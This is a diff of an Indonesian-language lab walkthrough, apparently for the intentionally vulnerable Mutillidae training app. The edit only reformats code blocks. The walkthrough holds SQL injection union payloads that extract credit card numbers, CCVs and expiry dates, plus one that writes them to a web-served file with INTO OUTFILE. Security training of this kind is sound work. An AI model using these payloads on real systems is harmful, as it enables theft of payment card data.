@@ -15,7 +15,9 @@
    - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
 3. Second Union SQL Injection Attempt
    - Pada kolom Textbox **Name** isikan 
-   ```' union select ccid,ccnumber,ccv,expiration,null from credit_cards -- ```
+   ```
+   ' union select ccid,ccnumber,ccv,expiration,null from credit_cards -- 
+   ```
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
    - Klik tombol View Account Details
 4. Viewing the Results
@@ -32,7 +34,9 @@
    - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
 4. Execute MySQL Union Injection
    - Pada kolom Textbox **Name** isikan 
-   ```' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- ```
+   ```
+   ' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
+   ```
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
    - Klik tombol View Account Details
 5. Viewing the Results
